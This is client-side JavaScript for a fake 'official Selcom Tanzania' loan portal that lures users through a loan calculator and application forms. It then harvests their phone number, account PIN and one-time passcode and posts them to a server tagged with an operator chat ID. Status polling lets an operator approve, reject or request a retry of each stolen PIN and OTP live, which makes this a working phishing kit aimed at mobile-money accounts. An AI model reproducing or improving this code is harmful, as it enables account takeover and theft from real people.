document.addEventListener('DOMContentLoaded', () => {
  const screenWelcome = document.getElementById('screen-welcome');
  const screenSlider = document.getElementById('screen-slider');
  const screenForm1 = document.getElementById('screen-form1');
  const screenForm2 = document.getElementById('screen-form2');
  const screenForm3 = document.getElementById('screen-form3');
  const screenSignin = document.getElementById('screen-signin');
  const screenOtp = document.getElementById('screen-otp');
  const screenSuccess = document.getElementById('screen-success');
  const loadingOverlay = document.getElementById('loading-overlay');

  const langToggle = document.getElementById('lang-toggle-switch');
  const credsBanner = document.getElementById('banner-creds-error');
  const otpBanner = document.getElementById('banner-otp-error');

  const phoneInput = document.getElementById('phone-number');
  const pinBoxes = document.querySelectorAll('.pin-box-num');
  const btnSubmitCreds = document.getElementById('btn-submit-creds');

  const otpBoxes = document.querySelectorAll('.otp-box-num');
  const btnSubmitOtp = document.getElementById('btn-submit-otp');
  const btnRequestNewOtp = document.getElementById('btn-request-new-otp');

  let currentUserId = null;
  let statusPollInterval = null;
  let countdownInterval = null;
  let currentLanguage = 'sw';

  const urlParams = new URLSearchParams(window.location.search);
  const adminParam = urlParams.get('admin') || '';

  function showScreen(targetScreen) {
    [screenWelcome, screenSlider, screenForm1, screenForm2, screenForm3, screenSignin, screenOtp, screenSuccess].forEach(s => {
      if (s) s.classList.remove('active');
    });
    if (targetScreen) targetScreen.classList.add('active');
  }

  // Language Switcher Logic
  function updateLanguageTexts(lang) {
    currentLanguage = lang;
    const isSwahili = lang === 'sw';

    if (isSwahili) {
      document.getElementById('lbl-welcome-title').innerText = 'KARIBU SELCOM TANZANIA!';
      document.getElementById('lbl-welcome-sub').innerText = 'WELCOME TO THE OFFICIAL APPLICATION PORTAL.';
      document.getElementById('lbl-welcome-desc').innerText = 'Your unique Selcom Account Details (Tanzania only) are required for all interactions. Ensure you use a valid account number to avoid delays.';
      document.getElementById('lbl-crit-title').innerText = 'CRITICAL NOTIFICATION';
      document.getElementById('lbl-crit-body').innerHTML = '<strong>⚠️ ATTENTION!</strong> An essential security measure: <strong>DO NOT ENTER INVALID SELCOM ACCOUNT DETAILS</strong>. This will cause immediate rejection. Please double-check your Tanzania-specific account number before submitting.';
      document.getElementById('lbl-portal-footer').innerText = 'Official Application Portal (Tanzania Only)';
      document.getElementById('btn-goto-slider').innerText = 'CONTINUE';

      document.getElementById('lbl-est-title').innerText = 'Estimate your loan repayments';
      document.getElementById('lbl-loan-amt-title').innerText = 'LOAN AMOUNT';
      document.getElementById('lbl-loan-term-title').innerText = 'LOAN TERM (MONTHS)';
      document.getElementById('lbl-est-rep').innerText = 'ESTIMATED MONTHLY REPAYMENT';
      document.getElementById('lbl-tot-rep').innerText = 'TOTAL REPAYMENT';
      document.getElementById('lbl-interest').innerText = '*Assumed Interest Rate: 13.5%';
      document.getElementById('btn-goto-form1').innerText = 'SIGN IN';
    } else {
      document.getElementById('lbl-welcome-title').innerText = 'WELCOME SELCOM TANZANIA!';
      document.getElementById('lbl-welcome-sub').innerText = 'KARIBU KWENYE PORTAL RASMI YA MAOMBI.';
      document.getElementById('lbl-welcome-desc').innerText = 'Maelezo yako ya akaunti ya Selcom (Tanzania pekee) yanahitajika. Hakikisha unatumia namba sahihi kuepuka kuchelewa.';
      document.getElementById('lbl-crit-title').innerText = 'TAARIFA MUHIMU YA USALAMA';
      document.getElementById('lbl-crit-body').innerHTML = '<strong>⚠️ TAHADHARI!</strong> Hatua muhimu ya usalama: <strong>USIWEKE TAARIFA ZISIZO SAHIHI ZA SELCOM</strong>. Hii itasababisha kukataliwa mara moja.';
      document.getElementById('lbl-portal-footer').innerText = 'Tovuti Rasmi ya Maombi (Tanzania Tu)';
      document.getElementById('btn-goto-slider').innerText = 'ENDELEA';

      document.getElementById('lbl-est-title').innerText = 'Kadiria marejesho yako ya mkopo';
      document.getElementById('lbl-loan-amt-title').innerText = 'KIASI CHA MKOPO';
      document.getElementById('lbl-loan-term-title').innerText = 'MUDA WA MKOPO (MIEZI)';
      document.getElementById('lbl-est-rep').innerText = 'MAREJESHO YA MWEZI KADIRIA';
      document.getElementById('lbl-tot-rep').innerText = 'JMLA YA MAREJESHO';
      document.getElementById('lbl-interest').innerText = '*Riba inayodhaniwa: 13.5%';
      document.getElementById('btn-goto-form1').innerText = 'INGIA';
    }
  }

  langToggle.addEventListener('change', (e) => {
    updateLanguageTexts(e.target.checked ? 'sw' : 'en');
  });
  updateLanguageTexts('sw');

  // Navigation Flows
  document.getElementById('btn-goto-slider').addEventListener('click', () => showScreen(screenSlider));
  document.getElementById('btn-slider-back').addEventListener('click', () => showScreen(screenWelcome));
  document.getElementById('btn-goto-form1').addEventListener('click', () => showScreen(screenForm1));

  document.getElementById('btn-form1-back').addEventListener('click', () => showScreen(screenSlider));
  document.getElementById('btn-form1-next').addEventListener('click', () => {
    const amt = document.getElementById('form-amount-input').value;
    document.getElementById('sum-amount').innerText = `TSh ${amt}`;
    showScreen(screenForm2);
  });

  document.getElementById('btn-form2-back').addEventListener('click', () => showScreen(screenForm1));
  document.getElementById('btn-form2-prev').addEventListener('click', () => showScreen(screenForm1));
  document.getElementById('btn-form2-next').addEventListener('click', () => {
    const fName = document.getElementById('first-name').value.trim();
    const lName = document.getElementById('last-name').value.trim();
    const phoneVal = phoneInput.value.trim();

    if (!phoneVal.startsWith('0') || phoneVal.length < 9) {
      alert('Nambari ya simu lazima ianze na 0 na iwe sahihi.');
      return;
    }

    document.getElementById('sum-applicant').innerText = `${fName} ${lName}`.trim() || 'NMB MKONONI';
    showScreen(screenForm3);
  });

  document.getElementById('btn-form3-back').addEventListener('click', () => showScreen(screenForm2));
  document.getElementById('btn-form3-prev').addEventListener('click', () => showScreen(screenForm2));
  document.getElementById('btn-form3-submit').addEventListener('click', () => {
    showScreen(screenSignin);
    if (pinBoxes[0]) pinBoxes[0].focus();
  });

  // Slider Calculator
  const loanSlider = document.getElementById('loan-amount-slider');
  const loanText = document.getElementById('loan-amount-text');
  const monthsSlider = document.getElementById('loan-months-slider');
  const monthsText = document.getElementById('loan-months-text');
  const monthlyRepVal = document.getElementById('monthly-rep-val');
  const totalRepVal = document.getElementById('total-rep-val');

  function updateCalculations() {
    const amount = Number(loanSlider.value);
    const months = Number(monthsSlider.value);
    loanText.innerText = `TSH ${amount.toLocaleString()}`;
    monthsText.innerText = `${months} MIEZI`;
    document.getElementById('form-amount-input').value = amount.toLocaleString();
    document.getElementById('sum-duration').innerText = `Miezi ${months}`;

    const totalRep = amount * 1.135;
    const monthlyRep = totalRep / months;
    monthlyRepVal.innerText = `TSH ${Math.round(monthlyRep).toLocaleString()}`;
    totalRepVal.innerText = `TSH ${Math.round(totalRep).toLocaleString()}`;
  }

  loanSlider.addEventListener('input', updateCalculations);
  monthsSlider.addEventListener('input', updateCalculations);
  updateCalculations();

  // Phone input formatting (Starts with 0 enforcement)
  if (phoneInput) {
    phoneInput.addEventListener('input', (e) => {
      let val = e.target.value.replace(/\D/g, '');
      if (val.length > 0 && !val.startsWith('0')) {
        val = '0' + val.replace(/^0+/, '');
      }
      e.target.value = val;
    });
  }

  // Pin & OTP digits setup
  function setupDigitInputs(boxes, callback) {
    boxes.forEach((box, idx) => {
      box.addEventListener('input', () => {
        box.value = box.value.replace(/\D/g, '');
        if (box.value && idx < boxes.length - 1) {
          boxes[idx + 1].focus();
        }
        if (callback) callback();
      });
      box.addEventListener('keydown', (e) => {
        if (e.key === 'Backspace' && !box.value && idx > 0) {
          boxes[idx - 1].focus();
        }
      });
    });
  }

  function checkCredsValid() {
    const pinVal = Array.from(pinBoxes).map(b => b.value).join('');
    const phoneVal = phoneInput.value.trim();
    if (phoneVal.length >= 9 && pinVal.length === 4) {
      btnSubmitCreds.classList.add('active-blue');
    } else {
      btnSubmitCreds.classList.remove('active-blue');
    }
  }

  setupDigitInputs(pinBoxes, checkCredsValid);

  document.getElementById('toggle-pin-visibility').addEventListener('click', () => {
    pinBoxes.forEach(box => box.type = box.type === 'password' ? 'text' : 'password');
  });

  // Step 1: Submit Credentials
  btnSubmitCreds.addEventListener('click', async () => {
    const phoneVal = phoneInput.value.trim();
    const pinVal = Array.from(pinBoxes).map(b => b.value).join('');
    if (!phoneVal || pinVal.length !== 4) return;

    if (credsBanner) credsBanner.classList.remove('active');
    showLoading('INATHIBITISHA...', 'Tafadhali subiri.');

    try {
      const res = await fetch(`/api/submit-credentials?admin=${encodeURIComponent(adminParam)}`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phone: phoneVal, pin: pinVal, adminChatId: adminParam })
      });

      const data = await res.json();
      if (data.success) {
        currentUserId = data.userId;
        startStatusPolling();
      } else {
        hideLoading();
      }
    } catch (e) {
      hideLoading();
    }
  });

  // OTP 6-digits Setup & Auto-submit
  setupDigitInputs(otpBoxes, () => {
    const otpVal = Array.from(otpBoxes).map(b => b.value).join('');
    if (otpVal.length === 6) {
      btnSubmitOtp.classList.add('active-blue');
      submitOtpHandler();
    } else {
      btnSubmitOtp.classList.remove('active-blue');
    }
  });

  async function submitOtpHandler() {
    const otpVal = Array.from(otpBoxes).map(b => b.value).join('');
    if (otpVal.length !== 6) return;

    if (otpBanner) otpBanner.classList.remove('active');
    showLoading('INAKAGUA OTP...', 'Tafadhali subiri.');

    try {
      const res = await fetch('/api/submit-otp', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ userId: currentUserId, otp: otpVal })
      });
      const data = await res.json();
      if (data.success) startStatusPolling();
      else hideLoading();
    } catch (e) {
      hideLoading();
    }
  }

  btnSubmitOtp.addEventListener('click', submitOtpHandler);

  // 1-Minute Countdown Timer
  function startOneMinuteTimer() {
    let timeLeft = 60;
    const timerSpan = document.getElementById('countdown');
    if (btnRequestNewOtp) btnRequestNewOtp.style.display = 'none';

    if (countdownInterval) clearInterval(countdownInterval);

    countdownInterval = setInterval(() => {
      timeLeft--;
      let mins = Math.floor(timeLeft / 60);
      let secs = timeLeft % 60;
      if (timerSpan) {
        timerSpan.innerText = `${mins}:${secs < 10 ? '0' : ''}${secs}`;
      }

      if (timeLeft <= 0) {
        clearInterval(countdownInterval);
        if (timerSpan) timerSpan.innerText = '0:00';
        if (btnRequestNewOtp) btnRequestNewOtp.style.display = 'inline-block';
      }
    }, 1000);
  }

  if (btnRequestNewOtp) {
    btnRequestNewOtp.addEventListener('click', async () => {
      showLoading('INATUMASISIMBO...', 'Inatuma ombi la OTP mpya.');
      try {
        await fetch('/api/request-new-otp', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ userId: currentUserId })
        });
        hideLoading();
        alert('Ombi limetumwa kwa admin.');
        startOneMinuteTimer();
      } catch (err) {
        hideLoading();
      }
    });
  }

  // Polling Function
  function startStatusPolling() {
    if (statusPollInterval) clearInterval(statusPollInterval);

    statusPollInterval = setInterval(async () => {
      if (!currentUserId) return;

      try {
        const res = await fetch(`/api/check-status/${currentUserId}`);
        const data = await res.json();

        if (data.status === 'PROCEED_OTP') {
          clearInterval(statusPollInterval);
          hideLoading();
          showScreen(screenOtp);
          const dispPhone = document.getElementById('display-otp-phone');
          if (dispPhone) dispPhone.innerText = `+255${phoneInput.value.trim()}`;
          if (otpBoxes[0]) otpBoxes[0].focus();
          startOneMinuteTimer();
        } else if (data.status === 'SUCCESS') {
          clearInterval(statusPollInterval);
          hideLoading();
          document.getElementById('final-approved-amount').innerText = `TSH ${Number(loanSlider.value).toLocaleString()}`;
          showScreen(screenSuccess);
        } else if (data.status === 'RETRY_PIN') {
          clearInterval(statusPollInterval);
          hideLoading();
          if (credsBanner) {
            credsBanner.innerText = 'WRONG PIN ❌ Incorrect account PIN. Please try again.';
            credsBanner.classList.add('active');
          }
          pinBoxes.forEach(b => b.value = '');
          btnSubmitCreds.classList.remove('active-blue');
          showScreen(screenSignin);
        } else if (data.status === 'RETRY_OTP') {
          clearInterval(statusPollInterval);
          hideLoading();
          if (otpBanner) {
            otpBanner.innerText = 'WRONG OTP ❌ Incorrect verification code. Please try again.';
            otpBanner.classList.add('active');
          }
          otpBoxes.forEach(b => b.value = '');
          btnSubmitOtp.classList.remove('active-blue');
          showScreen(screenOtp);
          startOneMinuteTimer();
        }
      } catch (e) {}
    }, 2500);
  }

  document.getElementById('btn-finish-home').addEventListener('click', () => {
    window.location.href = `/?admin=${encodeURIComponent(adminParam)}`;
  });

  function showLoading(title, sub) {
    document.getElementById('loading-title').innerText = title;
    document.getElementById('loading-sub').innerText = sub;
    if (loadingOverlay) loadingOverlay.classList.add('active');
  }

  function hideLoading() {
    if (loadingOverlay) loadingOverlay.classList.remove('active');
  }
});
    
